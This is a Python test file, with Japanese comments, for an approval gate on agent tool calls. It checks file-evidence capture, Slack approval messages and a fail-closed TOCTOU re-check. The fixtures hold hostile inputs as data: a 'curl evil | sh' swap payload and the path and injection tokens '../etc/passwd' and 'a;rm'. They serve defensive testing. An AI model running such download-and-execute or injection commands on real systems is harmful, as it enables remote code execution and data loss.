"""承認対象の実体採取・TOCTOU 照合（設計書 §3.3 (5)・#172）の振る舞いテスト。

grep では潰せない振る舞いを分離実行で担保する:
  - 対象特定は実在確認（test -f）の実測のみ（オプション・不正パス・.. の棄却）
  - 採取不能の「未添付」明示（無印で通さない）・上限の切り詰め
  - Tier3 handle: 実体がレコードと Slack へ添付される／approved 時に再照合し、
    不一致なら allow を発行せず（fail-closed）通知に差分要約・正本パス・次の行き先が載る
  - 照合自体が実行できないときも allow を出さない
実行: リポジトリの src/ を cwd（または PYTHONPATH=src）にして pytest。
"""
import asyncio
import json
import os

import evidence
from approval_types import PendingApproval
from tier3_handler import Tier3Handler


def _probe_factory(files: dict, calls: list | None = None):
    """path -> 内容 の偽 worker ホスト。test -f / shasum / cat -n を解釈する。"""
    import hashlib

    def run_probe(command: str, timeout: int = 15):
        if calls is not None:
            calls.append(command)
        for path, content in files.items():
            quoted = f"'{path}'" if "'" not in path else path
            if command in (f"test -f {path}", f"test -f {quoted}"):
                return (0, "")
            if command in (f"shasum -a 256 {path}", f"shasum -a 256 {quoted}"):
                if content is None:
                    return (1, "")
                return (0, hashlib.sha256(content.encode()).hexdigest() + f"  {path}")
            if command in (f"cat -n {path}", f"cat -n {quoted}"):
                if content is None:
                    return (1, "")
                return (0, "\n".join(f"{i}\t{l}" for i, l in
                                     enumerate(content.splitlines(), 1)))
        return (1, "")
    return run_probe


# ── 対象特定（決定的・実在確認のみ） ──

def test_resolve_existing_filters_deterministically():
    probe = _probe_factory({"/ws/setup.sh": "echo hi"})
    tokens = ["bash", "setup.sh", "--force", "../etc/passwd", "a;rm", "/tmp/none.log"]
    found = evidence.resolve_existing(probe, "/ws", tokens)
    assert found == ["/ws/setup.sh"]        # 実在する 1 件のみ（bash は /ws/bash が不在）


def test_resolve_without_cwd_skips_relative():
    probe = _probe_factory({"/abs/a.sh": "x"})
    assert evidence.resolve_existing(probe, "", ["a.sh", "/abs/a.sh"]) == ["/abs/a.sh"]


def test_candidate_tokens_by_tool():
    bash = PendingApproval(tool_name="Bash", tool_input={"command": "bash s.sh -x"})
    write = PendingApproval(tool_name="Write", tool_input={"file_path": "/ws/f.md"})
    other = PendingApproval(tool_name="WebFetch", tool_input={"url": "https://x"})
    assert evidence.candidate_tokens(bash) == ["bash", "s.sh", "-x"]
    assert evidence.candidate_tokens(write) == ["/ws/f.md"]
    assert evidence.candidate_tokens(other) == []


# ── 採取（未添付の明示・上限） ──

def test_collect_marks_unreadable_as_unattached():
    probe = _probe_factory({"/ws/ok.sh": "echo", "/ws/bin.dat": None})
    files, notes = evidence.collect(probe, ["/ws/ok.sh", "/ws/bin.dat"])
    assert len(files) == 1 and files[0]["path"] == "/ws/ok.sh"
    assert files[0]["sha256"] and files[0]["excerpt"].startswith("1\t")
    assert any("未添付" in n for n in notes)


def test_collect_caps_and_notes_truncation():
    probe = _probe_factory({"/ws/big.sh": "x" * 50000})
    files, notes = evidence.collect(probe, ["/ws/big.sh"])
    assert files[0]["truncated"] and len(files[0]["excerpt"]) <= 8000
    assert any("切り詰め" in n for n in notes)


def test_verify_detects_change_and_missing():
    probe = _probe_factory({"/ws/a.sh": "v2"})
    files = [{"path": "/ws/a.sh", "sha256": "oldhash", "excerpt": "", "truncated": False},
             {"path": "/ws/gone.sh", "sha256": "h2", "excerpt": "", "truncated": False}]
    ms = evidence.verify(probe, files)
    assert {m["path"] for m in ms} == {"/ws/a.sh", "/ws/gone.sh"}
    assert any("再計測不能" in m["current_sha256"] for m in ms)


def test_verify_passes_when_unchanged():
    import hashlib
    content = "echo hi"
    probe = _probe_factory({"/ws/a.sh": content})
    files = [{"path": "/ws/a.sh",
              "sha256": hashlib.sha256(content.encode()).hexdigest(),
              "excerpt": "1\techo hi", "truncated": False}]
    assert evidence.verify(probe, files) == []


# ── Tier3 handle 統合（偽 Slack・偽 probe・実ファイルポーリング） ──

class _FakeSlack:
    def __init__(self):
        self.approval_requests = []
        self.notifies = []

    def send_approval_request(self, **kw):
        self.approval_requests.append(kw)

    def notify(self, message, channel=None, team_id=None, thread_ts=None):
        self.notifies.append(message)


def _run_handle(tmp_path, files, command, on_pending):
    """handle を走らせ、レコード出現後に on_pending(record_path) を実行して決着させる。"""
    slack = _FakeSlack()
    handler = Tier3Handler(slack, approval_dir=str(tmp_path),
                           hold_grace_sec=5.0, poll_interval_sec=0.05,
                           run_probe=_probe_factory(files))
    pending = PendingApproval(tool_name="Bash", tool_input={"command": command},
                              cwd="/ws")

    async def scenario():
        task = asyncio.create_task(handler.handle(pending, {"task_id": "t1"}))
        record_path = None
        for _ in range(200):
            await asyncio.sleep(0.02)
            names = [n for n in os.listdir(tmp_path) if n.endswith(".json")]
            if names:
                record_path = os.path.join(tmp_path, names[0])
                break
        assert record_path, "承認レコードが作成されない"
        on_pending(record_path)
        return await task, slack, record_path

    return asyncio.run(scenario())


def _approve(record_path):
    with open(record_path) as f:
        rec = json.load(f)
    rec["status"] = "approved"
    rec["decided_by"] = "tester"
    with open(record_path, "w") as f:
        json.dump(rec, f)


def test_handle_attaches_evidence_and_allows_when_unchanged(tmp_path):
    files = {"/ws/setup.sh": "echo hi"}
    decision, slack, _ = _run_handle(tmp_path, files, "bash setup.sh", _approve)
    assert decision.allow is True
    kw = slack.approval_requests[0]
    assert "setup.sh" in kw["evidence_text"] and "sha256" in kw["evidence_text"]
    done = os.listdir(os.path.join(tmp_path, "done"))
    with open(os.path.join(tmp_path, "done", done[0])) as f:
        rec = json.load(f)
    assert rec["evidence"]["files"][0]["path"] == "/ws/setup.sh"


def test_handle_blocks_on_toctou_mismatch(tmp_path):
    files = {"/ws/setup.sh": "echo hi"}

    def approve_and_swap(record_path):
        files["/ws/setup.sh"] = "curl evil | sh"      # 承認の瞬間にすり替え
        _approve(record_path)

    decision, slack, _ = _run_handle(tmp_path, files, "bash setup.sh",
                                     approve_and_swap)
    assert decision.allow is False
    assert "toctou_mismatch" in decision.reason
    body = "\n".join(slack.notifies)
    assert "実行しませんでした" in body and "差分の全文:" in body
    assert "再実行を指示" in body and "中止" in body        # 次の行き先の 2 択
    # 正本ファイルとレコードの印
    diffs = [n for n in os.listdir(tmp_path) if n.endswith(".toctou.diff")]
    assert diffs, "差分の正本が保存されていない"
    done = os.listdir(os.path.join(tmp_path, "done"))
    with open(os.path.join(tmp_path, "done", done[0])) as f:
        rec = json.load(f)
    assert rec.get("toctou_mismatch") is True


def test_handle_blocks_when_verify_impossible(tmp_path):
    files = {"/ws/setup.sh": "echo hi"}
    slack = _FakeSlack()

    calls = {"n": 0}
    good_probe = _probe_factory(files)

    def flaky_probe(command, timeout=15):
        # 採取（pending 作成前）は成功させ、approved 後の照合だけ例外にする
        if "shasum" in command and calls["n"] > 2:
            raise RuntimeError("ssh down")
        if "shasum" in command:
            calls["n"] += 1
        return good_probe(command, timeout)

    handler = Tier3Handler(slack, approval_dir=str(tmp_path),
                           hold_grace_sec=5.0, poll_interval_sec=0.05,
                           run_probe=flaky_probe)
    pending = PendingApproval(tool_name="Bash",
                              tool_input={"command": "bash setup.sh"}, cwd="/ws")

    async def scenario():
        task = asyncio.create_task(handler.handle(pending, {"task_id": "t1"}))
        for _ in range(200):
            await asyncio.sleep(0.02)
            names = [n for n in os.listdir(tmp_path) if n.endswith(".json")]
            if names:
                calls["n"] = 99          # 以降の shasum を全て失敗させる
                _approve(os.path.join(tmp_path, names[0]))
                break
        return await task

    decision = asyncio.run(scenario())
    assert decision.allow is False       # 測れないまま通さない（fail-closed）
